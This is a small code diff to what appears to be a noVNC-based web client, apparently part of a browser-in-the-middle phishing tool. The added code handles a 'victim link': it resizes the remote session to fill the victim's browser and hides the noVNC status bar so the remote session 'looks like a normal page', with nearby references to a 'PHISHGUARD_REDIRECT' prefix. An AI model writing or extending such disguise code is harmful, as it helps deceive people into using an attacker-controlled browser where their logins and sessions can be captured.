@@ -67,6 +67,17 @@
 
         rfb.viewOnly = readQueryVariable('view_only', false);
         rfb.scaleViewport = readQueryVariable('scale', false);
+        // Victim link: ask the server to match the viewer's window size live, so
+        // the page fills the browser with no black bars (scaleViewport stays on
+        // as a fallback if the server can't resize). The preview keeps its fixed
+        // framebuffer + scaling so Site Tweaker has room to work.
+        if (allowRedirect) {
+            rfb.resizeSession = true;
+            rfb.clipViewport = false;
+            // Hide the noVNC status bar so it looks like a normal page.
+            const tb = document.getElementById('top_bar');
+            if (tb) tb.style.display = 'none';
+        }
 
         // ─── Clipboard sync (laptop ⇄ remote desktop) ─────────────────────────
         const REDIRECT_PREFIX = "PHISHGUARD_REDIRECT::";
